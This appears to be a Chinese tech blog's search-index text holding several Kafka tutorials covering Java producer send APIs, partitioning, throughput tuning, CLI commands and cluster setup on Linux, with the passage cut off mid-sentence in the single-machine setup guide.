生产者重要参数列表 生产者异步发送 API普通的异步发送提示 本节所需的案例代码，可以直接从 GitHub 下载对应章节 kafka-lesson-01。 Maven 依赖 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.kafka&lt;/groupId&gt; &lt;artifactId&gt;kafka-clients&lt;/artifactId&gt; &lt;version&gt;3.2.1&lt;/version&gt;&lt;/dependency&gt; Java 代码 123456789101112131415161718192021public class CustomerProducer { public static void main(String[] args) { Properties properties = new Properties(); // 指定Kafka集群的连接信息 properties.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, "127.0.0.1:9092,127.0.0.1:9093"); // 指定序列化器（必需） properties.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName()); properties.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName()); // 创建生产者对象 KafkaProducer&lt;String, String&gt; producer = new KafkaProducer&lt;&gt;(properties); for (int i = 0; i &lt; 5; i++) { // 异步发送消息 producer.send(new ProducerRecord&lt;&gt;("test", "hello kafka " + i)); } // 关闭资源 producer.close(); }} 测试代码 第一步：启动 Kafka 的控制台消费者： 1# ./kafka-console-consumer.sh --bootstrap-server 127.0.0.1:9092 --topic test 第二步：在 IDE 工具中执行代码，观察控制台消费者中是否接收到消息，如下所示： 12345hello kafka 0hello kafka 1hello kafka 2hello kafka 3hello kafka 4 带回调函数的异步发送回调方法会在 Producer 收到 ack 时调用，且为异步调用；该方法有两个参数，分别是元数据信息（RecordMetadata）和异常信息（Exception）。如果 Exception 为 null，则说明消息发送成功，如果 Exception 不为 null，则说明消息发送失败。值得一提的是，消息发送失败会自动重试发送，不需要在回调函数中手动重试发送。 Java 代码 12345678910111213141516171819202122232425262728public class CustomerProducer2 { public static void main(String[] args) { Properties properties = new Properties(); // 指定Kafka集群的连接信息 properties.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, "127.0.0.1:9092,127.0.0.1:9093"); // 指定序列化器（必需） properties.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName()); properties.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName()); // 创建生产者对象 KafkaProducer&lt;String, String&gt; producer = new KafkaProducer&lt;&gt;(properties); for (int i = 0; i &lt; 5; i++) { // 异步发送消息（带回调函数） producer.send(new ProducerRecord&lt;&gt;("test", "hello kafka " + i), new Callback() { @Override public void onCompletion(RecordMetadata recordMetadata, Exception exception) { if (exception == null) { System.out.println("topic: " + recordMetadata.topic() + ", partition: " + recordMetadata.partition()); } } }); } // 关闭资源 producer.close(); }} 测试代码 除了在 Kafka 的控制台消费者中接收到消息之外，还可以在 IDE 的控制台看到如下的输出信息： 12345topic: test, partition: 0topic: test, partition: 0topic: test, partition: 0topic: test, partition: 0topic: test, partition: 0 生产者同步发送 API提示 本节所需的案例代码，可以直接从 GitHub 下载对应章节 kafka-lesson-02。 普通的同步发送同步发送的意思就是，当一条消息发送之后，会阻塞当前线程，直至收到 ack 应答。由于 send() 方法返回的是一个 Future 对象，根据 Futrue 对象的特点，只需调用 Future 对象的 get() 方法即可实现同步发送。 Maven 依赖 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.kafka&lt;/groupId&gt; &lt;artifactId&gt;kafka-clients&lt;/artifactId&gt; &lt;version&gt;3.2.1&lt;/version&gt;&lt;/dependency&gt; Java 代码 12345678910111213141516171819202122232425public class CustomerProducer { public static void main(String[] args) { Properties properties = new Properties(); // 指定Kafka集群的连接信息 properties.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, "127.0.0.1:9092,127.0.0.1:9093"); // 指定序列化器（必需） properties.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName()); properties.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName()); // 创建生产者对象 KafkaProducer&lt;String, String&gt; producer = new KafkaProducer&lt;&gt;(properties); for (int i = 0; i &lt; 5; i++) { // 同步发送消息 try { producer.send(new ProducerRecord&lt;&gt;("test", "hello kafka " + i)).get(); } catch (Exception e) { e.printStackTrace(); } } // 关闭资源 producer.close(); }} 测试代码 第一步：启动 Kafka 的控制台消费者： 1# ./kafka-console-consumer.sh --bootstrap-server 127.0.0.1:9092 --topic test 第二步：在 IDE 工具中执行代码，观察控制台消费者中是否接收到消息，如下所示： 12345hello kafka 0hello kafka 1hello kafka 2hello kafka 3hello kafka 4 带回调函数的同步发送1234567891011121314151617181920212223242526272829303132public class CustomerProducer2 { public static void main(String[] args) { Properties properties = new Properties(); // 指定Kafka集群的连接信息 properties.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, "127.0.0.1:9092,127.0.0.1:9093"); // 指定序列化器（必需） properties.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName()); properties.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName()); // 创建生产者对象 KafkaProducer&lt;String, String&gt; producer = new KafkaProducer&lt;&gt;(properties); for (int i = 0; i &lt; 5; i++) { // 同步发送消息（带回调函数） try { producer.send(new ProducerRecord&lt;&gt;("test", "hello kafka " + i), new Callback() { @Override public void onCompletion(RecordMetadata recordMetadata, Exception exception) { if (exception == null) { System.out.println("topic: " + recordMetadata.topic() + ", partition: " + recordMetadata.partition()); } } }).get(); } catch (Exception e) { e.printStackTrace(); } } // 关闭资源 producer.close(); }} 测试代码 除了在 Kafka 的控制台消费者中接收到消息之外，还可以在 IDE 的控制台看到如下的输出信息： 12345topic: test, partition: 0topic: test, partition: 2topic: test, partition: 0topic: test, partition: 1topic: test, partition: 2 生产者分区生产者分区分区的优点 提高并行度，生产者可以以分区为单位发送数据，消费者可以以分区为单位消费数据 便于合理使用存储资源，每个 Partition 在一个 Broker 上存储，可以把海量的数据按照分区切割成一块一块的数据并存储在多台 Broker 上。合理控制分区的任务，可以实现负载均衡的效果 生产者发送消息的分区策略默认的分区器类是 DefaultPartitioner，部分源码如下： 123456789101112131415/** * The default partitioning strategy: * &lt;ul&gt; * &lt;li&gt;If a partition is specified in the record, use it * &lt;li&gt;If no partition is specified but a key is present choose a partition based on a hash of the key * &lt;li&gt;If no partition or key is present choose the sticky partition that changes when the batch is full. * * See KIP-480 for details about sticky partitioning. */public class DefaultPartitioner implements Partitioner { ......} 通过 KafkaProducer 类的 send() 方法发送消息时，需要指定 ProducerRecord 对象作为参数，ProducerRecord 类的构造方法如下： 12345678910111213141516171819202122232425public class ProducerRecord&lt;K, V&gt; { public ProducerRecord(String topic, Integer partition, Long timestamp, K key, V value, Iterable&lt;Header&gt; headers) { ...... } public ProducerRecord(String topic, Integer partition, Long timestamp, K key, V value) { ...... } public ProducerRecord(String topic, Integer partition, K key, V value, Iterable&lt;Header&gt; headers) { ...... } public ProducerRecord(String topic, Integer partition, K key, V value) { ...... } public ProducerRecord(String topic, K key, V value) { ...... } public ProducerRecord(String topic, V value) { ...... } 调用 ProducerRecord 类不同的构造方法时，有以下几种分区策略： 在指明 partition 的情况下，直接将指明的值作为 partition 值。例如：partition=0，那么数据会被写入分区 0。 在没有指明 partition 值，但有指定 key 的情况下，将 key 的 Hash 值与 topic 的 partition 数进行取余来得到 partition 值。例如：key 的 Hash 值是 5，topic 的 partition 数是 2，那么 key 对应的 value 会被写入 1 号分区。 在既没有指明 partition 值，又没有指定 key 的情况下，Kafka 会采用 Sticky Partition 黏性分区器，也就是会随机选择一个分区，并尽可能一直使用该分区，等该分区的 batch 已满或者已完成，Kafka 再随机一个分区进行使用（和上一次选的分区不同）。例如：第一次随机选择 0 号分区，等 0 号分区当前批次满了（默认 16K 大小）或者 linger.ms 设置的时间到了，Kafka 会再随机选择一个分区进行使用（如果还是 0 分区会继续随机选择一个分区）。 自定义生产者的分区器开发人员可以根据业务需求自定义分区器，只需要实现 Partitioner 接口即可。 提示 本节所需的案例代码，可以直接从 GitHub 下载对应章节 kafka-lesson-03。 自定义分区器类，实现 Partitioner 接口，并重写 partition() 方法 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152/** * 自定义分区器 */public class CustomPartitioner implements Partitioner { /** * 返回消息对应的分区 * * @param topic 主题 * @param key 消息的 key * @param keyBytes 消息的 key 序列化后的字节数组 * @param value 消息的 value * @param valueBytes 消息的 value 序列化后的字节数组 * @param cluster 集群元数据可以查看分区信息 * @return */ @Override public int partition(String topic, Object key, byte[] keyBytes, Object value, byte[] valueBytes, Cluster cluster) { // 获取消息内容 String msgValue = value.toString(); // 定义分区号 int partition; if (msgValue.contains("order")) { partition = 0; } else { partition = 1; } // 返回分区号 return partition; } /** * 关闭资源 */ @Override public void close() { } /** * 配置信息 * * @param configs */ @Override public void configure(Map&lt;String, ?&gt; configs) { }} 在生产者的配置中添加分区器参数，以此来指定自定义分区器 12345678910111213141516171819202122232425262728293031/** * 异步发送 */public class CustomerProducer { public static void main(String[] args) { Properties properties = new Properties(); // 指定Kafka集群的连接信息 properties.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, "127.0.0.1:9092,127.0.0.1:9093"); // 指定序列化器（必需） properties.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName()); properties.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName()); // 指定自定义分区器 properties.setProperty(ProducerConfig.PARTITIONER_CLASS_CONFIG, CustomPartitioner.class.getName()); // 创建生产者对象 KafkaProducer&lt;String, String&gt; producer = new KafkaProducer&lt;String, String&gt;(properties); for (int i = 0; i &lt; 5; i++) { // 异步发送消息 producer.send(new ProducerRecord&lt;&gt;("test", "hello kafka " + i), new Callback() { @Override public void onCompletion(RecordMetadata metadata, Exception exception) { System.out.println("Partition : " + metadata.partition()); } }); } // 关闭资源 producer.close(); }} 生产者最佳实践生产者如何提高吞吐量参数优化为了让生产者提高吞吐量（发送消息的效率），可以优化以下几个参数： batch.size：批次大小，默认 16k linger.ms：等待时间，默认 0ms，修改为 5-100ms compression.type：压缩方式，默认是 none，修改过为 snappy RecordAccumulator：缓冲区（双端队列）大小，默认是 32m，修改为 64m 参数说明 示例代码提示 本节所需的案例代码，可以直接从 GitHub 下载对应章节 kafka-lesson-04。 123456789101112131415161718192021222324252627282930public class CustomerProducer { public static void main(String[] args) { Properties properties = new Properties(); // 指定Kafka集群的连接信息 properties.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, "127.0.0.1:9092,127.0.0.1:9093"); // 指定序列化器（必需） properties.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName()); properties.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName()); // 等待时间（默认0ms） properties.put(ProducerConfig.LINGER_MS_CONFIG, 5); // 批次大小（默认16K） properties.put(ProducerConfig.BATCH_SIZE_CONFIG, 16 * 1024); // 压缩方式（默认none） properties.put(ProducerConfig.COMPRESSION_TYPE_CONFIG, "snappy"); // 缓冲区大小（默认32M） properties.put(ProducerConfig.BUFFER_MEMORY_CONFIG, 64 * 1024 * 1024); // 创建生产者对象 KafkaProducer&lt;String, String&gt; producer = new KafkaProducer&lt;&gt;(properties); for (int i = 0; i &lt; 5; i++) { // 异步发送消息 producer.send(new ProducerRecord&lt;&gt;("test", "hello kafka " + i)); } // 关闭资源 producer.close(); }} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"分布式"},{title:"Kafka 入门教程之一",url:"/posts/b6be8183.html",text:'消息队列目前企业中比较常见的消息队列产品主要有 Kafka、ActiveMQ、RabbitMQ、RocketMQ 等。在大数据场景主要采用 Kafka 作为消息队列，而在 JavaEE 开发中主要采用 ActiveMQ、RabbitMQ、RocketMQ。 消息队列的优势 解耦 - 允许独立的扩展或修改两边的处理过程，只要确保它们遵守同样的接口约束 缓冲 - 有助于控制和优化数据流经过系统的速度，解决生产消息和消费消息的处理速度不一致的情况 消峰 - 在访问量剧增的情况下，应用仍然需要继续发挥作用，但是这样的突发流量并不常见。如果为以能处理这类峰值访问为标准来投入资源并随时待命，这无疑是巨大的浪费。使用消息队列能够使关键组件顶住突发的访问压力，而不会因为突发的超负荷的请求而完全崩溃 异步通信 - 很多时候，用户不想也不需要立即处理消息。消息队列提供了异步处理机制，允许用户把一个消息放入队列，但并不立即处理它。想向队列中放入多少消息就放多少，然后在需要的时候再去处理它们 可恢复性 - 系统的一部分组件失效时，不会影响到整个系统。消息队列降低了进程间的耦合度，所以即使一个处理消息的进程挂掉，加入队列中的消息仍然可以在系统恢复后被处理 消息队列的两种模式点对点模式点对点模式 就是一对一，消费者主动拉取数据，消息收到后消息会被清除。消息生产者将消息发送到 Queue 中，然后消息消费者从 Queue 中取出并消费消息。消息被消费以后，Queue 中不再存储它，所以消息消费者不可能消费到已经被消费的消息。Queue 支持存在多个消费者，但是对一个消息而言，只会有一个消费者可以消费。 发布 / 订阅模式发布/订阅模式 就是一对多，消息产生后主动推送给订阅者，消费者消费消息之后不会清除消息。消息生产者（发布）将消息发布到 topic 主题（如浏览、点赞、收藏、评论等）中，同时有多个消息消费者（订阅）消费该消息。这和点对点模式不同，每个消费者互相独立，发布到 topic 的消息会被所有订阅者消费。 Kafka 详细介绍在流式计算中，Kafka 一般用于缓存数据，Storm 通过消费 Kafka 的数据来进行计算。 Apache Kafka 是一个开源的分布式消息队列系统，由 Scala 语言编写。 Kafka 最初由 LinkedIn 公司开发，并于 2011 年初开源。2012 年 10 月从 Apache Incubator 毕业，该项目的目标是为处理实时数据提供一个统一、高通量、低等待的平台。 Kafka 集群由多个 Kafka 实例（broker）组成，无论是 Kafka 集群，还是 Consumer 都依赖于 Zookeeper 集群保存一些 meta 信息，以此来保证系统的高可用性。 Kafka 概述 传统定义：Kafka 是一个分布式的基于发布 / 订阅模式的消息队列（Message Queue），主要应用于大数据实时处理领域。 最新定义：Kafka 是一个开源的分布式事件流平台（EventStreaming Platform），被数千家公司用于高性能数据管道、流分析、数据集成和关键任务应用。 Kafka 学习路线 Kafka 学习路线 Kafka 基础架构 Producer：消息生产者，就是向 Kafka Broker 发消息的客户端。 Consumer：消息消费者，就是向 Kafka Broker 取消息的客户端。 Consumer Group (CG)：消费者组，由多个 consumer 组成。消费者组内每个消费者负责消费不同分区的数据，一个分区只能由一个组内消费者消费，消费者组之间互不影响。所有的消费者都属于某个消费者组，即消费者组是逻辑上的一个订阅者。 Broker：一台 Kafka 服务器就是一个 broker。一个 Kafka 集群由多个 broker 组成。一个 broker 可以容纳多个 topic。 Topic：主题，可以理解为一个队列，生产者和消费者面向的都是一个 topic。 Partition：分区，为了实现扩展性，一个非常大的 topic 可以分布到多个 broker（即 Kafka 服务器）上，一个 topic 可以分为多个 partition，每个 partition 是一个有序的队列。 Replica：副本，为保证集群中的某个节点发生故障时，该节点上的 partition 数据不丢失，且让 Kafka 仍然能够继续工作，Kafka 为此提供了副本机制。一个 topic 的每个分区都有若干个副本，包括一个 leader 和若干个 follower。 Leader：每个分区多个副本的 主，生产者发送数据的对象，以及消费者消费数据的对象都是 leader。 Follower：每个分区多个副本的 从，实时从 leader 中同步数据，保持和 leader 数据的同步。leader 发生故障时，某个 follower 会成为新的 leader。 Kafka 企业案例 Kafka 集群搭建单机搭建 Kafka 集群 Linux 单机搭建 Kafka 集群 生产环境搭建 Kafka 集群 Linux 生产环境搭建 Kafka 集群 Kafka 常用命令Topic 命令命令参数 使用案例 创建主题：创建名称为 test、分区数量为 1 和 分区副本数量为 3 的主题 1# ./kafka-topics.sh --create --bootstrap-server 127.0.0.1:9092 --topic test --partitions 1 --replication-factor 3 查看主题列表 1# ./kafka-topics.sh --list --bootstrap-server 127.0.0.1:9092 查看主题详情：查看 test 主题的详细信息（例如分区数量、分区副本数量等） 1# ./kafka-topics.sh --describe --bootstrap-server 127.0.0.1:9092 --topic test 更改主题的分区数量：更改 test 主题的分区数量为 3 1# ./kafka-topics.sh --alter --bootstrap-server 127.0.0.1:9092 --topic test --partitions 3 特别注意 Kafka 不支持更改主题的分区副本数量 更改主题的分区数量时，只能增加，不能减少 删除主题：删除 test 主题 1# ./kafka-topics.sh --delete --bootstrap-server 127.0.0.1:9092 --topic test Consumer 命令命令参数 使用案例 消费 test 主题中的数据（增量消费） 1# ./kafka-console-consumer.sh --bootstrap-server 127.0.0.1:9092 --topic test 消费 test 主题中的所有数据（包括历史数据） 1# ./kafka-console-consumer.sh --bootstrap-server 127.0.0.1:9092 --topic test --from-beginning Producer 命令命令参数 使用案例 生产消息：往 test 主题发送消息 1# ./kafka-console-producer.sh --broker-list 127.0.0.1:9092 --topic test var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"分布式"},{title:"Linux 生产环境搭建 Kafka 集群",url:"/posts/6dceb9c9.html",text:'前言本文适用于在 Centos/Debian/Ubuntu 等 Linux 发行版系统上，使用多台物理机器（至少三台）搭建 Kafka 集群。 Zookeeper 集群搭建本文的 Kafka 集群搭建依赖于 Zookeeper，因此生产环境需要将 Zookeeper 集群提前搭建起来。值得一提的是，从 Kafka 2.8.0 版本开始，Kafka 自身实现了 Raft 分布式一致性机制，这意味着 Kafka 是可以脱离 ZooKeeper 独立运行的。 集群规划 节点 IP 地址 端口 版本号 Zookeeper 节点 1 192.168.1.1 2181 3.4.10 Zookeeper 节点 2 192.168.1.2 2181 3.4.10 Zookeeper 节点 3 192.168.1.3 2181 3.4.10 集群部署由于篇幅有限，Linux 生产环境搭建 Zookeeper 集群的内容这里不再累述，详细教程可看 这里。 Kafka 集群搭建集群规划 节点 IP 地址 端口 版本号 Kafka 节点 1 192.168.1.1 9092 2.13-3.2.1 Kafka 节点 2 192.168.1.2 9092 2.13-3.2.1 Kafka 节点 3 192.168.1.3 9092 2.13-3.2.1 集群搭建 Kafka 下载 Kafka 的安装包可以从 官网 下载。 以下载得到的压缩文件 kafka_2.13-3.2.1.tgz 为例，2.11 是 Scala 的版本号，3.2.1 是 Kafka 的版本号。 Kafka 安装 1234567891011121314151617# 创建安装目录# mkdir -p /usr/local/kafka-cluster# 进入安装目录# cd /usr/local/kafka-cluster# 下载文件# wget https://downloads.apache.org/kafka/3.2.1/kafka_2.13-3.2.1.tgz# 解压文件# tar -xvf kafka_2.13-3.2.1.tgz# 重命名目录# mv kafka_2.13-3.2.1 kafka-node1# 删除文件# rm -rf kafka_2.13-3.2.1.tgz Kafka 基础配置 12345678# 进入安装目录# cd /usr/local/kafka-cluster/kafka-node1# 创建日志目录（数据存储目录）# mkdir logs# 编辑配置文件（指定以下内容即可）# vim config/server.properties 最关键的配置内容是 broker.id、log.dirs、zookeeper.connect，其中的 zookeeper.connect 是 Zookeeper 连接地址，建议使用 /kafka 作为后缀，这样方便日后在 Zookeeper 里统一管理 Kafka 的数据。 12345678910111213141516171819202122232425262728# broker 的全局唯一编号,不能重复broker.id=1# 处理网络请求的线程数量num.network.threads=3# 用来处理磁盘 IO 的现成数量num.io.threads=8# 发送套接字的缓冲区大小socket.send.buffer.bytes=102400# 接收套接字的缓冲区大小socket.receive.buffer.bytes=102400# 请求套接字的缓冲区大小socket.request.max.bytes=104857600# 运行日志存放的路径log.dirs=/usr/local/kafka-cluster/kafka-node1/logs# topic 在当前 broker 上的分区个数num.partitions=1# 用来恢复和清理 data 下数据的线程数量num.recovery.threads.per.data.dir=1# 每个 topic 创建时的副本数,默认时 1 个副本offsets.topic.replication.factor=1# 每个 segment 文件保留的最长时间,超时将被删除log.retention.hours=168# 每个 segment 文件的大小,默认最大 1Glog.segment.bytes=1073741824# 检查过期数据的时间,默认 5 分钟检查一次是否数据过期log.retention.check.interval.ms=300000# 配置连接 Zookeeper 集群地址zookeeper.connect=192.168.1.1:2181,192.168.1.2:2181,192.168.1.3:2181/kafka Kafka 创建多个节点 复制两份上面已经配置好的 Kafka 安装目录到其他服务器节点上，以此作为集群中另外两个节点的安装文件，例如 kafka-node2、kafka-node3。安装目录复制完成后，还需要更改每个新节点里的 server.properties 配置文件的 broker.id、log.dirs。节点二和节点三的最终配置如下： 123# 节点二的配置broker.id=2log.dirs=/usr/local/kafka-cluster/kafka-node2/logs 123# 节点三的配置broker.id=3log.dirs=/usr/local/kafka-cluster/kafka-node3/logs 集群管理 集群启动 注意 启动 Kafka 集群之前，必须确保 Zookeeper 集群已经启动成功，这是因为本文搭建的 Kafka 集群依赖于 Zookeeper 集群。 123456789# 后台启动# /usr/local/kafka-cluster/kafka-node1/bin/kafka-server-start.sh -daemon /usr/local/kafka-cluster/kafka-node1/config/server.properties# /usr/local/kafka-cluster/kafka-node2/bin/kafka-server-start.sh -daemon /usr/local/kafka-cluster/kafka-node2/config/server.properties# /usr/local/kafka-cluster/kafka-node3/bin/kafka-server-start.sh -daemon /usr/local/kafka-cluster/kafka-node3/config/server.properties# 或者前台启动（可直接查看启动时输出的日志信息）# /usr/local/kafka-cluster/kafka-node1/bin/kafka-server-start.sh /usr/local/kafka-cluster/kafka-node1/config/server.properties# /usr/local/kafka-cluster/kafka-node2/bin/kafka-server-start.sh /usr/local/kafka-cluster/kafka-node2/config/server.properties# /usr/local/kafka-cluster/kafka-node3/bin/kafka-server-start.sh /usr/local/kafka-cluster/kafka-node3/config/server.properties 查看状态 集群启动后，可以使用以下命令查看集群的运行状态。如果发现集群启动失败，则可以使用前台的方式再次启动集群，然后根据终端输出的错误日志信息来定位问题。 12345678910# 查看端口占用情况# netstat -nplt | grep 9092# netstat -nplt | grep 9093# netstat -nplt | grep 9094# 查看Kafka进程# ps -aux | grep kafka# 查看Java进程# jps -l 集群关闭 注意 关闭 Kafka 集群时，一定要等 Kafka 所有节点进程全部关闭后再关闭 Zookeeper 集群。因为 Zookeeper 集群当中记录着 Kafka 集群的相关信息，Zookeeper 集群一旦先关闭，Kafka 集群就没有办法再获取关闭进程的信息，此时只能手动强制杀死 Kafka 进程。 123# /usr/local/kafka-cluster/kafka-node1/bin/kafka-server-stop.sh stop# /usr/local/kafka-cluster/kafka-node2/bin/kafka-server-stop.sh stop# /usr/local/kafka-cluster/kafka-node3/bin/kafka-server-stop.sh stop 清空数据 若希望清空 Kafka 集群的数据，则可以按照以下步骤操作。清空数据的操作不可恢复，生产环境下慎用。 第一步：关闭 Kafka 集群第二步：连接 Zookeeper 集群，然后删除 /kafka 目录第三步：删除 Kafka 各个集群节点的安装目录下的 logs 目录（文件夹）第四步：重启 Kafka 集群 集群测试 进入任意节点的安装目录下的 bin 目录 12# 进入安装目录# cd /usr/local/kafka-cluster/kafka-node1/bin 创建主题 12# 创建主题# ./kafka-topics.sh --create --bootstrap-server 192.168.1.1:9092 --replication-factor 3 --partitions 1 --topic test 查看主题列表 12# 查看主题列表# ./kafka-topics.sh --list --bootstrap-server 192.168.1.1:9092 查看主题详细信息 12# 查看主题详细信息# ./kafka-topics.sh --bootstrap-server 192.168.1.1:9092 --topic test --describe 启动控制台消费者 12# 启动消费者# ./kafka-console-consumer.sh --bootstrap-server 192.168.1.1:9092 --topic test --from-beginning 启动控制台生产者 12# 启动生产者# ./kafka-console-producer.sh --broker-list 192.168.1.1:9092 --topic test 生产者正常启动后，在生产者的控制台手动输入 hello kafka，消费者的控制台就可以消费到生产者的消息，并输出 hello kafka，这表示消费者成功消费了生产者发送的消息！ Kafka 更改端口（可选）若希望更改 Kafka 的默认端口（9092），可以按照以下步骤更改 Kafka 安装目录下 config 子目录里的各个配置文件。例如可以将 Kafka 的默认端口更改为 9090，如下所示： 1234# vim config/server.properties# 默认端口号listeners=PLAINTEXT://:9090 1234# vim config/connect-standalone.properties# 单机环境的端口号bootstrap.servers=localhost:9090 1234# vim config/connect-distributed.properties# 集群环境的端口号bootstrap.servers=localhost:9090 1234# vim config/producer.properties# 发布端的端口号bootstrap.servers=localhost:9090 1234# vim config/consumer.properties# 消费端的端口号bootstrap.servers=localhost:9090 参考博客 Kafka 集群搭建超详细教程 Linux 单机搭建 Kafka 集群 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"Linux 单机搭建 Kafka 集群",url:"/posts/124a5015.html",text:'前言本文适用于在 Centos/Debian/Ubuntu 等 Linux 发行版系统上，使用单机搭建 Kafka 集群。 Zookeeper 集群搭建本文的 Kafka 集群搭建依赖于 Zookeeper，因此需要将 Zookeeper 单机集群提前搭建起来。值得一提的是，从 Kafka 2.8.0 版本开始，Kafka 自身实现了 Raft 分布式一致性机制，这意味着 Kafka 是可以脱离 ZooKeeper 独立运行的。 集群规划 节点 IP 地址 端口 版本号 Zookeeper 节点 1 127.0.0.1 2181 3.4.10 Zookeeper 节点 2 127.0.0.1 2182 3.4.10 Zookeeper 节点 3 127.0.0.1 2183 3.4.10 集群搭建由于篇幅有限，Linux 单机搭建 Zookeeper 集群的内容这里不再累述，详细教程可看 这里。 Kafka 集群搭建集群规划 节点 IP 地址 端口 版本号 Kafka 节点 1 127.0.0.1 9092 2.13-3.2.1 Kafka 节点 2 127.0.0.1 9093 2.13-3.2.1 Kafka 节点 3 127.0.0.1 9094 2.13-3.2.1 集群搭建 Kafka 下载 Kafka 的安装包可以从 官网 下载。 以下载得到的压缩文件 kafka_2.13-3.2.1.tgz 为例，2.11 是 Scala 的版本号，3.2.1 是 Kafka 的版本号。 Kafka 安装 1234567891011121314151617# 创建安装目录# mkdir -p /usr/local/kafka-cluster# 进入安装目录# cd /usr/local/kafka-cluster# 下载文件# wget https://downloads.apache.org/kafka/3.2.1/kafka_2.13-3.2.1.tgz# 解压文件# tar -xvf kafka_2.13-3.2.1.tgz# 重命名目录# mv kafka_2.13-3.2.1 kafka-node1# 删除文件# rm -rf kafka_2.13-3.2.1.tgz Kafka 基础配置 12345678# 进入安装目录# cd /usr/local/kafka-cluster/kafka-node1# 创建日志目录（数据存储目录）# mkdir logs# 编辑配置文件（指定以下内容即可）# vim config/server.properties 最关键的配置内容是 broker.id、log.dirs、zookeeper.connect，其中的 zookeeper.connect 是 Zookeeper 连接地址，建议使用 /kafka 作为后缀，这样方便日后在 Zookeeper 里统一管理 Kafka 的数据。在项目的开发测试阶段，其他配置内容暂时可以使用默认值。 12345678910111213141516171819202122232425262728# broker 的全局唯一编号,不能重复broker.id=1# 处理网络请求的线程数量num.network.threads=3# 用来处理磁盘 IO 的现成数量num.io.threads=8# 发送套接字的缓冲区大小socket.send.buffer.bytes=102400# 接收套接字的缓冲区大小socket.receive.buffer.bytes=102400# 请求套接字的缓冲区大小socket.request.max.bytes=104857600# 运行日志存放的路径log.dirs=/usr/local/kafka-cluster/kafka-node1/logs# topic 在当前 broker 上的分区个数num.partitions=1# 用来恢复和清理 data 下数据的线程数量num.recovery.threads.per.data.dir=1# 每个 topic 创建时的副本数,默认时 1 个副本offsets.topic.replication.factor=1# 每个 segment 文件保留的最长时间,超时将被删除log.retention.hours=168# 每个 segment 文件的大小,默认最大 1Glog.segment.bytes=1073741824# 检查过期数据的时间,默认 5 分钟检查一次是否数据过期log.retention.check.interval.ms=300000# 配置连接 Zookeeper 集群地址zookeeper.connect=127.0.0.1:2181,127.0.0.1:2182,127.0.0.1:2183/kafka Kafka 端口配置 单机搭建 Kafka 集群时，为了解决端口冲突的问题，还需要指定 Kafka 监听的端口，必须将下述各个配置文件里的端口都更改掉。 1234# vim config/server.properties# 默认端口号listeners=PLAINTEXT://:9092 1234# vim config/connect-standalone.properties# 单机环境的端口号bootstrap.servers=localhost:9092 1234# vim config/connect-distributed.properties# 集群环境的端口号bootstrap.servers=localhost:9092 1234# vim config/producer.properties# 发布端的端口号bootstrap.servers=localhost:9092 1234# vim config/consumer.properties# 消费端的端口号bootstrap.servers=localhost:9092 Kafka 创建多个节点 复制两份上面已经配置好的 Kafka 安装目录，以此作为集群中另外两个节点的安装文件，例如 kafka-node2、kafka-node3。安装目录复制完成后，还需要为每个新节点按照以下步骤更改对应的内容： 第一步：更改 server.properties 配置文件里的 broker.id、log.dirs第二步：更改 Kafka 监听的端口，包括更改上述的 